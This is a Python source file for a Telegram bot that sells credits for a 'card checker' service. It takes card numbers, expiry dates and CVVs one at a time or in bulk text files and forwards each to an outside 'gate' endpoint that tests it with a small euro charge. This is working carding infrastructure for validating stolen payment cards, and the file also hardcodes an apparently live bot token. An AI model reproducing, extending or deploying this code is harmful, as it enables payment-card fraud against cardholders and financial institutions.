import logging
import requests
import telebot
from threading import Event
import time
import json
import random
import string

# Telegram bot token
TOKEN = "7386696229:AAFQ0m0O94-ljMHZdqPD5NMXHciC98HkE9k"
OWNER_ID = 7427691214  # Owner's Telegram ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Define the API endpoint and static parameters
url = "https://daxxteam.com/gate/chk.php"

# Event to control the stopping of the card check process
stop_event = Event()

# Lists to store authorized group IDs, user IDs with credits, blocked users, and credit codes
authorized_groups = []
user_credits = {}
blocked_users = []
credit_codes = {}

# Load authorized groups, user credits, blocked users, and credit codes from file (if exists)
try:
    with open('authorized_groups.json', 'r') as file:
        authorized_groups = json.load(file)
except FileNotFoundError:
    authorized_groups = []

try:
    with open('user_credits.json', 'r') as file:
        user_credits = json.load(file)
except FileNotFoundError:
    user_credits = {}

try:
    with open('blocked_users.json', 'r') as file:
        blocked_users = json.load(file)
except FileNotFoundError:
    blocked_users = []

try:
    with open('credit_codes.json', 'r') as file:
        credit_codes = json.load(file)
except FileNotFoundError:
    credit_codes = {}

def save_authorized_groups():
    with open('authorized_groups.json', 'w') as file:
        json.dump(authorized_groups, file)

def save_user_credits():
    with open('user_credits.json', 'w') as file:
        json.dump(user_credits, file)

def save_blocked_users():
    with open('blocked_users.json', 'w') as file:
        json.dump(blocked_users, file)

def save_credit_codes():
    with open('credit_codes.json', 'w') as file:
        json.dump(credit_codes, file)

def generate_random_code(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Start command handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ YOU ARE BLOCKED FROM USING THIS BOT.")
        return
    bot.send_message(message.chat.id, "👋 WELCOME! USE /REGISTER TO REGISTER AND GET 10 CREDITS. USE THE /CHK COMMAND FOLLOWED BY CARD DETAILS IN THE FORMAT `CC|MM|YYYY|CVV`, OR SEND A TXT FILE WITH CARD DETAILS. USE /STOP TO STOP THE CARD CHECK PROCESS.")

# /cmds command handler
@bot.message_handler(commands=['cmds'])
def send_cmds(message):
    cmds_message = (
        "📋 AVAILABLE COMMANDS:\n"
        "/START - WELCOME MESSAGE\n"
        "/CMDS - LIST ALL COMMANDS\n"
        "/REGISTER - REGISTER AND GET 10 CREDITS\n"
        "/INFO - GET YOUR INFORMATION\n"
        "/ADD - AUTHORIZE A GROUP OR USER\n"
        "/REMOVE - UNAUTHORIZE A GROUP OR USER\n"
        "/CHK - CHECK CARD DETAILS\n"
        "/STOP - STOP THE CARD CHECK PROCESS\n"
        "/BUY - VIEW CREDIT PACKAGES AND PRICING\n"
        "/BLOCK - BLOCK A USER\n"
        "/UNBLOCK - UNBLOCK A USER\n"
        "/GET_CREDIT <NUMBER> - GENERATE CREDIT CODE\n"
        "/REDEEM <CODE> - REDEEM A CREDIT CODE\n"
        "/USE <CODE> - REDEEM A CREDIT CODE\n"
    )
    bot.reply_to(message, cmds_message)

# /register command handler
@bot.message_handler(commands=['register'])
def register_user(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ YOU ARE BLOCKED FROM USING THIS BOT.")
        return
    user_id = message.from_user.id
    if user_id in user_credits:
        bot.reply_to(message, "✅ YOU ARE ALREADY REGISTERED.")
        return
    
    user_credits[user_id] = 10
    save_user_credits()
    bot.reply_to(message, "🎉 YOU HAVE BEEN REGISTERED AND RECEIVED 10 CREDITS.")

# /info command handler
@bot.message_handler(commands=['info'])
def user_info(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ YOU ARE BLOCKED FROM USING THIS BOT.")
        return
    user_id = message.from_user.id
    if user_id not in user_credits and user_id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT REGISTERED. USE /REGISTER TO REGISTER.")
        return

    credits = "UNLIMITED" if user_id == OWNER_ID else user_credits.get(user_id, 0)
    rank = "OWNER" if user_id == OWNER_ID else "PREMIUM" if credits > 0 else "FREE"
    username = message.from_user.username or "N/A"
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
    
    info_message = (
        f"ℹ️ USER INFORMATION:\n"
        f"👤 USERNAME: {username}\n"
        f"🆔 USER ID: {user_id}\n"
        f"📛 FULL NAME: {full_name}\n"
        f"💰 CREDITS: {credits}\n"
        f"🔰 RANK: {rank}\n"
    )
    bot.reply_to(message, info_message)

# /add command handler to authorize a group or user
@bot.message_handler(commands=['add'])
def add_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "ℹ️ USAGE: /ADD GROUP <GROUP_ID> OR /ADD <USER_ID> <CREDITS>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id not in authorized_groups:
            authorized_groups.append(group_id)
            save_authorized_groups()
            bot.reply_to(message, f"✅ GROUP {group_id} HAS BEEN AUTHORIZED FOR CC CHECKS.")
        else:
            bot.reply_to(message, f"ℹ️ GROUP {group_id} IS ALREADY AUTHORIZED.")

    else:
        if len(args) != 3:
            bot.reply_to(message, "ℹ️ USAGE: /ADD <USER_ID> <CREDITS>")
            return
        user_id = int(args[1])
        credits = int(args[2])
        user_credits[user_id] = user_credits.get(user_id, 0) + credits
        save_user_credits()
        bot.reply_to(message, f"✅ USER {user_id} HAS BEEN AUTHORIZED WITH {credits} CREDITS.")

# /remove command handler to unauthorize a group or user
@bot.message_handler(commands=['remove'])
def remove_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "ℹ️ USAGE: /REMOVE GROUP <GROUP_ID> OR /REMOVE USERID <USER_ID>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id in authorized_groups:
            authorized_groups.remove(group_id)
            save_authorized_groups()
            bot.reply_to(message, f"✅ GROUP {group_id} HAS BEEN UNAUTHORIZED.")
        else:
            bot.reply_to(message, f"ℹ️ GROUP {group_id} IS NOT AUTHORIZED.")

    elif args[1] == 'userid':
        user_id = int(args[2])
        if user_id in user_credits:
            del user_credits[user_id]
            save_user_credits()
            bot.reply_to(message, f"✅ USER {user_id} HAS BEEN UNAUTHORIZED.")
        else:
            bot.reply_to(message, f"ℹ️ USER {user_id} IS NOT AUTHORIZED.")

    else:
        bot.reply_to(message, "❌ INVALID TYPE. USE 'GROUP' OR 'USERID'.")

# /chk command handler
@bot.message_handler(commands=['chk'])
def check_card(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ YOU ARE BLOCKED FROM USING THIS BOT.")
        return
    user_id = message.from_user.id
    if user_id != OWNER_ID and user_id not in user_credits and message.chat.id not in authorized_groups:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "❌ YOU DON'T HAVE ENOUGH CREDITS TO USE THIS COMMAND.")
        return

    card_details = message.text.split()[1:]
    if not card_details:
        bot.reply_to(message, "ℹ️ PLEASE PROVIDE CARD DETAILS IN THE FORMAT `CC|MM|YYYY|CVV`.")
        return

    stop_event.clear()

    for card in card_details:
        if stop_event.is_set():
            bot.reply_to(message, "🛑 CARD CHECK PROCESS STOPPED.")
            break

        if user_id != OWNER_ID:
            user_credits[user_id] -= 1
            save_user_credits()

        start_time = time.time()
        params = {
            'lista': card,
            'mode': 'cvv',
            'amount': 0.5,
            'currency': 'eur'
        }
        try:
            response = requests.get(url, params=params)
            end_time = time.time()
        except requests.exceptions.RequestException as e:
            bot.reply_to(message, f"❌ ERROR CONNECTING TO API: {e}")
            continue
        
        if response.headers.get('Content-Type') == 'application/json':
            try:
                response_data = response.json()
                bot.reply_to(message, response_data.get("response", "ℹ️ NO RESPONSE"))
            except requests.exceptions.JSONDecodeError:
                bot.reply_to(message, f"❌ FAILED TO DECODE JSON RESPONSE. RESPONSE CONTENT: {response.text}")
                continue
        else:
            bot.reply_to(message, response.text)

        time.sleep(10)

# Document handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ YOU ARE BLOCKED FROM USING THIS BOT.")
        return
    user_id = message.from_user.id
    if user_id not in user_credits and user_id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT REGISTERED. USE /REGISTER TO REGISTER.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "❌ YOU DON'T HAVE ENOUGH CREDITS TO USE THIS COMMAND.")
        return

    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('lista.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('lista.txt', 'r') as f:
            lista_values = f.readlines()
        
        stop_event.clear()

        for lista in lista_values:
            if stop_event.is_set():
                bot.reply_to(message, "🛑 CARD CHECK PROCESS STOPPED.")
                break

            if user_id != OWNER_ID:
                user_credits[user_id] -= 1
                save_user_credits()

            start_time = time.time()
            lista = lista.strip()
            if lista:
                params = {
                    'lista': lista,
                    'mode': 'cvv',
                    'amount': 0.5,
                    'currency': 'eur'
                }
                try:
                    response = requests.get(url, params=params)
                    end_time = time.time()
                except requests.exceptions.RequestException as e:
                    bot.reply_to(message, f"❌ ERROR CONNECTING TO API: {e}")
                    continue
                
                if response.headers.get('Content-Type') == 'application/json':
                    try:
                        response_data = response.json()
                        bot.reply_to(message, response_data.get("response", "ℹ️ NO RESPONSE"))
                    except requests.exceptions.JSONDecodeError:
                        bot.reply_to(message, f"❌ FAILED TO DECODE JSON RESPONSE. RESPONSE CONTENT: {response.text}")
                        continue
                else:
                    bot.reply_to(message, response.text)

                time.sleep(10)

# /stop command handler
@bot.message_handler(commands=['stop'])
def stop_process(message):
    if message.from_user.id == OWNER_ID:
        stop_event.set()
        bot.reply_to(message, "🛑 CARD CHECK PROCESS HAS BEEN STOPPED.")
    else:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")

# /buy command handler
@bot.message_handler(commands=['buy'])
def buy_credits(message):
    buy_message = (
        "💳 CREDIT PACKAGES:\n"
        "100 CREDITS - $1\n"
        "500 CREDITS - $5\n"
        "1000 CREDITS - $8\n"
        "CONTACT @YourExDestiny TO PURCHASE."
    )
    bot.reply_to(message, buy_message)

# /block command handler
@bot.message_handler(commands=['block'])
def block_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ USAGE: /BLOCK <USER_ID>")
        return

    user_id = int(args[1])
    if user_id not in blocked_users:
        blocked_users.append(user_id)
        save_blocked_users()
        bot.reply_to(message, f"✅ USER {user_id} HAS BEEN BLOCKED.")
    else:
        bot.reply_to(message, f"ℹ️ USER {user_id} IS ALREADY BLOCKED.")

# /unblock command handler
@bot.message_handler(commands=['unblock'])
def unblock_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ USAGE: /UNBLOCK <USER_ID>")
        return

    user_id = int(args[1])
    if user_id in blocked_users:
        blocked_users.remove(user_id)
        save_blocked_users()
        bot.reply_to(message, f"✅ USER {user_id} HAS BEEN UNBLOCKED.")
    else:
        bot.reply_to(message, f"ℹ️ USER {user_id} IS NOT BLOCKED.")

# /get_credit command handler
@bot.message_handler(commands=['get_credit'])
def get_credit_code(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ YOU ARE NOT AUTHORIZED TO USE THIS COMMAND.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ USAGE: /GET_CREDIT <NUMBER_OF_CREDITS>")
        return

    credits = int(args[1])
    code = generate_random_code()
    credit_codes[code] = credits
    save_credit_codes()
    bot.reply_to(message, f"✅ CREDIT CODE GENERATED: {code} FOR {credits} CREDITS.")

# /redeem and /use command handler
@bot.message_handler(commands=['redeem', 'use'])
def redeem_code(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ YOU ARE BLOCKED FROM USING THIS BOT.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ USAGE: /REDEEM <CODE> OR /USE <CODE>")
        return

    code = args[1]
    if code in credit_codes:
        credits = credit_codes.pop(code)
        save_credit_codes()
        user_id = message.from_user.id
        user_credits[user_id] = user_credits.get(user_id, 0) + credits
        save_user_credits()
        bot.reply_to(message, f"🎉 YOU HAVE REDEEMED {credits} CREDITS.")
    else:
        bot.reply_to(message, "❌ INVALID CODE.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot.polling(none_stop=True)
